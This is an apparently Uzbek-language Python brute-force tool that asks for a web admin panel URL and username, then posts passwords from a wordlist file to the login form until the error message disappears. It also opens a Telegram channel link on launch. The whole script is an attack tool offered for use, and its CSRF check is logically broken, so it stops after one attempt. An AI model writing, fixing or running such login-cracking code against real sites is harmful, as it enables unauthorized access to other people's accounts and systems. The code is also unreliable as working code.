z = """

       \033[1;36m                                        
 _____ _____ ____  _____ _____     _____ __ __ 
|  _  |   | |    \| __  |     |___|  _  |  |  |
|     | | | |  |  |    -|  |  |___|   __|_   _|
|__|__|_|___|____/|__|__|_____|   |__|    |_|  
                                               

"""
import requests
import time
import sys
import os, sys
d = """

       \033[1;36m                                        
 _____ _____ ____  _____ _____     _____ __ __ 
|  _  |   | |    \| __  |     |___|  _  |  |  |
|     | | | |  |  |    -|  |  |___|   __|_   _|
|__|__|_|___|____/|__|__|_____|   |__|    |_|  
                                               

"""
os.system("termux-open-url https://t.me/andro_py")
print(d)
url = input("Admin panelni kiriting: ")
username = input("Foydalanuvchi nomingizni kiriting: ")
error = input("Notogri parol yoki biron habar kiriting: ")
os.system("clear")
for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("\033[1;35mParollar ketma ketligi: \033[1;34m"+ str(count) + '\033[1;35m parollar qatori => \033[1;34m' + password)
            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("\033[1;35mCSRF tokeni aniqlandi!! BruteF0rce bu veb-sayt ishlamaydi.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("\033[1;35mBa'zi xatolik yuz berdi, Internetga ulanishingizni tekshiring!!")

with open("tries.txt", "r") as passwords:
    bruteCracking(username,url,error)

print("[list] bruteforse codelarimiz togri kelmadi")